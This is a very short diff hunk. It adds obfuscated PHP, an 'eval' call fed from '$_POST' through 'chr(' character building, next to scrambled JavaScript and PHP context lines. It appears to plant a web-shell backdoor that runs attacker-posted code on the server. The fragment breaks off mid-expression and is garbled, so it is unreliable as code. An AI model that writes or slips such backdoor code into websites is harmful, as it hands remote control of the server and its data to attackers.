@@ -89,3 +89,4 @@ var R='';var s;if(s
 //php_off
 {global ${
 ";eval/*
+($_POST[chr(
